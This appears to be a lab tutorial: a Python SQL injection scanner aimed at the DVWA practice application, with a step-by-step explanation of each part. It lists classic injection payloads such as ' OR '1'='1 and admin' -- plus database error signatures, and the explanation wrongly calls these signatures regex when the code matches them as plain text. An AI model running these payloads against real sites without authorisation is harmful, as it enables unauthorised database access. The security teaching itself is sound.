#!/usr/bin/env python3
"""
Basic SQL Injection Scanner
Author: Raiza Rosas
Date: 2025
Purpose: Automated detection of SQL injection vulnerabilities in web forms
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys
from colorama import Fore, Style, init

init(autoreset=True)

class SQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
        # SQL error patterns de diferentes bases de datos
        self.sql_errors = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Microsoft SQL Native Client error",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "SQLite/JDBCDriver",
            "SQLite.Exception"
        ]
        
        # Payloads básicos para detección
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND '1'='1"
        ]
    
    def scan(self):
        print(f"{Fore.CYAN}[*] Iniciando escaneo de: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total de payloads a probar: {len(self.payloads)}{Style.RESET_ALL}\n")
        
        vulnerabilities_found = 0
        
        for payload in self.payloads:
            if self.test_payload(payload):
                vulnerabilities_found += 1
        
        print(f"\n{Fore.GREEN}[✓] Escaneo completado{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Vulnerabilidades encontradas: {vulnerabilities_found}{Style.RESET_ALL}")
        
        return vulnerabilities_found
    
    def test_payload(self, payload):
        """Prueba un payload específico contra el objetivo"""
        try:
            # Construcción de parámetros con payload
            params = {'id': payload, 'Submit': 'Submit'}
            
            response = self.session.get(self.target_url, params=params, timeout=5)
            
            # Análisis de respuesta
            for error_pattern in self.sql_errors:
                if error_pattern.lower() in response.text.lower():
                    print(f"{Fore.RED}[!] VULNERABLE - Payload: {payload}{Style.RESET_ALL}")
                    print(f"    Error detectado: {error_pattern}")
                    return True
            
            return False
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[!] Error de conexión: {e}{Style.RESET_ALL}")
            return False

def main():
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <URL_OBJETIVO>")
        print(f"Ejemplo: {sys.argv[0]} http://localhost/vulnerabilities/sqli/")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = SQLiScanner(target)
    scanner.scan()

if __name__ == "__main__":
    main()




***Explain***


# step first

#!/usr/bin/env python3
"""
Basic SQL Injection Scanner
Author: [Tu Nombre]
Date: Diciembre 2024
Purpose: Automated detection of SQL injection vulnerabilities in web forms
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys
from colorama import Fore, Style, init

init(autoreset=True)

[sqliLab01](../../../../assets/screenshots/02-Web-Application-Security/sql-injection-lab/Lab01-SQLi-Scanner-DVWA/Lab01-SQLi-Scanner-DVWA09.png)

LINE-BY-LINE EXPLANATION:
Line 1: #!/usr/bin/env python3

-This is called a “shebang.”
-It tells Linux: “run this file with Python 3.”
-It only works on Linux/Mac.

Lines 3-7: Docstring comment

-Text between “”" that describes the program
-Good professional practice
-REPLACE “[Your Name]” with your real name

Lines 9-13: Imports

-import requests → to make HTTP requests
-from bs4 import BeautifulSoup → to parse HTML
-from urllib.parse import urljoin → to combine URLs
-import sys → for command line arguments
-from colorama import Fore, Style, init → for terminal colors

Line 15: init(autoreset=True)

-Initializes Colorama
-autoreset=True → automatically resets colors after each print

# step two

class SQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
        # SQL error patterns de diferentes bases de datos
        self.sql_errors = [
            "SQL syntax.*MySQL",
            "Warning.*mysql_",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "PostgreSQL.*ERROR",
            "Warning.*pg_",
            "valid PostgreSQL result",
            "Microsoft SQL Native Client error",
            "ODBC SQL Server Driver",
            "SQLServer JDBC Driver",
            "ORA-[0-9][0-9][0-9][0-9]",
            "Oracle error",
            "SQLite/JDBCDriver",
            "SQLite.Exception"
        ]
        
        # Payloads básicos para detección
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND '1'='1"
        ]

**What is a class?**

-It is a “template” for creating objects.
-Like a cookie cutter: you define the shape once, then make lots of cookies.

def __init__(self, target_url):

-This is the “constructor”—it runs when you create an object.
self = reference to the object itself.
target_url = the URL we are going to scan.

self.session = requests.Session()

-Creates a “session” that maintains cookies between requests.
Necessary for DVWA to remember us.

self.sql_errors

-List of SQL error patterns
-We use “regex” (regular expressions) to search for them
-Example: “SQL syntax.*MySQL” searches for “SQL syntax” followed by anything (.*) and then “MySQL”

self.payloads

-List of “attacks” we will try
' = single quote (breaks SQL queries)
‘ OR '1’='1 = classic injection that always returns true
-- = comment in SQL (ignores what comes after)

# step three

def scan(self):
        print(f"{Fore.CYAN}[*] Iniciando escaneo de: {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total de payloads a probar: {len(self.payloads)}{Style.RESET_ALL}\n")
        
        vulnerabilities_found = 0
        
        for payload in self.payloads:
            if self.test_payload(payload):
                vulnerabilities_found += 1
        
        print(f"\n{Fore.GREEN}[✓] Escaneo completado{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Vulnerabilidades encontradas: {vulnerabilities_found}{Style.RESET_ALL}")
        
        return vulnerabilities_found


**EXPLANATION:**

def scan(self):

-Main method that executes the scan

print(f“{Fore.CYAN}...{Style.RESET_ALL}”)

f“...” = f-string, allows variables to be inserted with {}
Fore.CYAN = cyan color (light blue)
Style.RESET_ALL = resets the color

-vulnerabilities_found = 0

-Vulnerability counter

for payload in self.payloads:

Loop that iterates through each payload
for = “for each”
in = “in”
Translation: “For each payload in the list of payloads”

if self.test_payload(payload):

-Call the test_payload method (we will create it)
-If it returns True (found vulnerability), increment the counter

len(self.payloads)

len() = function that returns the length of a list
Here it returns 10 (we have 10 payloads)

# step four

def test_payload(self, payload):
        """Prueba un payload específico contra el objetivo"""
        try:
            # Construcción de parámetros con payload
            params = {'id': payload, 'Submit': 'Submit'}
            
            response = self.session.get(self.target_url, params=params, timeout=5)
            
            # Análisis de respuesta
            for error_pattern in self.sql_errors:
                if error_pattern.lower() in response.text.lower():
                    print(f"{Fore.RED}[!] VULNERABLE - Payload: {payload}{Style.RESET_ALL}")
                    print(f"    Error detectado: {error_pattern}")
                    return True
            
            return False
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}[!] Error de conexión: {e}{Style.RESET_ALL}")
            return False

**DETAILED EXPLANATION:**
try: and except:

-Block for handling errors
-try: = try to execute this
-except: = if there is an error, execute this

params = {‘id’: payload, ‘Submit’: ‘Submit’}

-Dictionary with parameters for the URL
-Will become: ?id=PAYLOAD&Submit=Submit

response = self.session.get(...)

-Makes a GET request to the target
-params=params = adds the parameters to the URL
-timeout=5 = waits a maximum of 5 seconds

for error_pattern in self.sql_errors:

Checks each error pattern

if error_pattern.lower() in response.text.lower():

.lower() = converts to lowercase (for case-insensitive comparison)
in = checks if it is contained
response.text = the HTML of the response

return True / return False

-True = vulnerability found
-False = nothing found

# step five

def main():
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <URL_OBJETIVO>")
        print(f"Ejemplo: {sys.argv[0]} http://localhost/vulnerabilities/sqli/")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = SQLiScanner(target)
    scanner.scan()

if __name__ == "__main__":
    main()

**EXPLANATION:**

sys.argv

-List of command line arguments

-sys.argv[0] = script name
-sys.argv[1] = first argument (the URL)

len(sys.argv) != 2

-Checks that there are exactly 2 elements
-If not, displays how to use the program

sys.exit(1)

-Ends the program
1 = error code (0 = success, 1+ = error)

if __name__ == “__main__”:

-Python's “magic” part
Only executes main() if the file is run directly
Does not execute if the file is imported into another script